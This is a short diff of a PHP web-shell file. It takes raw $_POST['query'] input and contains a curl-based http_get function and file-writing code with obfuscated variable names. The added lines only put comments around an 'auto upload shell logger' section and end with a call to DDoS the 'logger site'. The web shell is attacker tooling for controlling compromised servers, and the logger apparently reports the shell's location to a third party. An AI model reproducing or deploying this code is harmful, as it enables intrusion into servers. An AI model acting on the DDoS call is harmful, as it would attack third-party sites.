@@ -1594,6 +1594,12 @@ if($_POST['query']){ $veriyfy = stripslashes(stripslashes($_POST['query']));
 
 
 <?php
+
+
+// AUOT UPLOAD SHELL LOGGER START HERE
+
+
+
 function http_get($url){
 $im = curl_init($url);
 curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
@@ -1736,4 +1742,10 @@ fwrite($open1234567891011121314151617181920, $text123456789101112131415161718192
 fclose($open1234567891011121314151617181920);
 if(file_exists($check1234567891011121314151617181920)){
 }
+
+// AUTO UPLOAD SHELL LOGGER END HERE
+// DDOS THOSE LOGGER SITE PLEASE, SO NOBODY WILL FALL FOR THAT LOGGER AGAIN
+
+
+
 ?>
